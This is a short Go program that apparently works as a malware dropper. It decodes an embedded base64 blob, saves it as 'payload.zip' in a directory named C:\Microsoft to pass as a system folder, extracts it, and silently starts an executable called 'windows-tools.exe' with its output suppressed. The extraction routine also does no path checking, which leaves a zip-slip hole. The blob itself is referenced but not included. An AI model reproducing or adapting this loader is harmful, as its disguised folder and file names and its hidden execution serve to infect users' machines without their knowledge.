package main

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
)

func main() {
	targetDir := `C:\Microsoft`

	err := os.MkdirAll(targetDir, os.ModePerm)
	if err != nil {
		fmt.Println("error:", err)
		return
	}

	zipData, err := base64.StdEncoding.DecodeString(DATA_ZIP)
	if err != nil {
		fmt.Println("erro base64:", err)
		return
	}

	zipPath := filepath.Join(targetDir, "payload.zip")
	err = os.WriteFile(zipPath, zipData, 0644)
	if err != nil {
		fmt.Println("error ZIP:", err)
		return
	}

	err = unzip(zipData, targetDir)
	if err != nil {
		fmt.Println("erro:", err)
		return
	}

	exePath := filepath.Join(targetDir, "windows-tools.exe")
	cmd := exec.Command(exePath)
	cmd.Dir = targetDir
	cmd.Stdout = nil
	cmd.Stderr = nil

	err = cmd.Start()
	if err != nil {
		fmt.Println("erro start exe:", err)
		return
	}

	fmt.Println("good")
}

func unzip(zipBytes []byte, dest string) error {
	reader, err := zip.NewReader(bytes.NewReader(zipBytes), int64(len(zipBytes)))
	if err != nil {
		return err
	}

	for _, file := range reader.File {
		path := filepath.Join(dest, file.Name)

		if file.FileInfo().IsDir() {
			os.MkdirAll(path, os.ModePerm)
			continue
		}

		if err := os.MkdirAll(filepath.Dir(path), os.ModePerm); err != nil {
			return err
		}

		dstFile, err := os.Create(path)
		if err != nil {
			return err
		}
		defer dstFile.Close()

		fileInArchive, err := file.Open()
		if err != nil {
			return err
		}
		defer fileInArchive.Close()

		_, err = io.Copy(dstFile, fileInArchive)
		if err != nil {
			return err
		}
	}
	return nil
}
